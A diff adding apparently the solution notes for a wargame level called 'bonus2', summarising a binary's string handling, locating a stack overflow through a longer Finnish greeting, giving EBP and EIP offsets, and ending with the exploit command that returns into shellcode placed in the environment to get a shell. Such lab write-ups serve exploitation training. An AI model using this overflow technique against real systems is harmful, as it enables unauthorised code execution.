@@ -1,0 +1,33 @@
+needs two arguments
+
+copies the first 40 char of av[1] in a variable (let's call it myargs)
+
+copies 32 characters of av[2] to myargs + 40
+
+getenv("LANG") in a var
+
+checks if it exists
+
+compares lang_var to fi and then to nl
+sets language int accordingly
+
+concatenates a greeting based on language value with myargs
+
+calls are
+strncpy, memcmp and strcat
+we should be able to overflow
+
+
+after changing the LANG var to "fi" to have a longer greeting 
+with len(av[1]) > 40, we can overflow with the second arg in the ebp and the eip
+ebp offset = 14
+eip offset = 18
+
+we can do the same exploit as bonus0 (SHELLCODE in env)
+
+export LANG="fi"
+./bonus2 `python -c 'print("a" * 40)'` `python -c 'print("a" * 18 + "\x1d\xf8\xff\xbf")'`
+
+// replace env address if needed
+
+we are inside a shell
